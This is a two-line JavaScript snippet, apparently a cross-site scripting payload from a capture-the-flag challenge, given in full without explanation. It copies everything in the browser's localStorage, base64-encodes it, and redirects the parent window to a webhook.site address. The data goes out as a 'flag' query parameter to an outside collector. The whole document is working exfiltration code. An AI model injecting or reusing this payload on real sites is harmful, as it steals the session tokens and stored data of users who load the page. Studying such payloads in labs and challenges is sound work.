const flag = JSON.stringify({ ...localStorage })

window.parent.document.location = `https://webhook.site/40a6771d-b79d-4ea5-bbb3-df68cdcf56b7?flag=${encodeURIComponent(btoa(flag))}`
